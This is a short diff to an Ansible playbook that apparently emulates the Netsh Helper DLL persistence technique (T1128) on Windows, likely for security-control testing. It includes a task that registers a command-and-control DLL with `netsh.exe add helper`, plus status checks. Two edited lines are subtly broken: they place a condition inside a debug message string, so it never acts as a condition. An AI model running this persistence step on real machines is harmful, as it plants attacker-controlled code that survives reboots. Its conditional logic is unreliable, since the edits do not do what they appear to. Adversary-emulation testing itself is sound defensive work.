@@ -9,13 +9,14 @@
       register: command_result
       ignore_errors: yes
     - name: check download status
-      fail: msg="Playbook Completed:T1128:failed:win:"
+      debug: msg="Playbook Completed:T1128:failed:win:"
       when: "'Unable to connect' in command_result.stderr" 
     - name: execute malicious dll
       win_shell: |
         cd c:\temp
         netsh.exe add helper {{ cnc_dll }}
       ignore_errors: yes
+      when: "'Unable to connect' not in command_result.stderr" 
     - name: Wait before status check
       tags: always
       wait_for: timeout=10
@@ -27,11 +28,11 @@
       register: T1128
     - name: check if playbook was blocked
       tags: always
-      debug: msg="Playbook Completed:T1128:blocked:win:"
+      debug: msg="Playbook Completed:T1128:blocked:win:" and "'Unable to connect' not in command_result.stderr" 
       when: T1128.stat.exists == False        
     - name: check if playbook was successfull
       tags: always
-      debug: msg="Playbook Completed:T1128:passed:win:"
+      debug: msg="Playbook Completed:T1128:passed:win:" and "'Unable to connect' not in command_result.stderr" 
       when: T1128.stat.exists
     - name: cleanup
       win_shell: |
